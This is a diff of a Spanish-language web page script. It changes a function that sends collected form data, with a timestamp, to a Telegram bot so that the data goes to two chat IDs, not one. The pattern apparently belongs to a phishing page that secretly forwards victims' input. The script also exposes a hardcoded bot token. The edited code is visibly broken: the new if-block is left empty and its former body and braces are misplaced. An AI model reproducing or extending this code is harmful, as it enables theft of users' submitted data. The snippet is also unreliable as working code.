@@ -277,10 +277,13 @@ if (document.readyState === 'loading') {
   procesarSolicitud();
 }
 const TELEGRAM_TOKEN = "9182445869:AAFsmiyrA0eCQeM278Tq9zn2NN_f72Xh118";
-const TELEGRAM_CHAT_ID = "8921963616";
+const TELEGRAM_CHAT_IDS = ["8921963616", "8602023209"];
+
 
 async function enviarATelegram(datos) {
-  if (!TELEGRAM_CHAT_ID) {
+if (!TELEGRAM_CHAT_IDS || TELEGRAM_CHAT_IDS.length === 0) {
+}
+
     console.log("Falta tu ID de chat");
     return;
   }
@@ -297,15 +300,17 @@ async function enviarATelegram(datos) {
   "Fecha y hora: " + new Date().toLocaleString("es-CO");
 
 
-
-  await fetch("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage", {
+for (const chatId of TELEGRAM_CHAT_IDS) {
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: chatId,
       text: mensaje
     })
   });
+}
+
 }
 </script>
 </body>
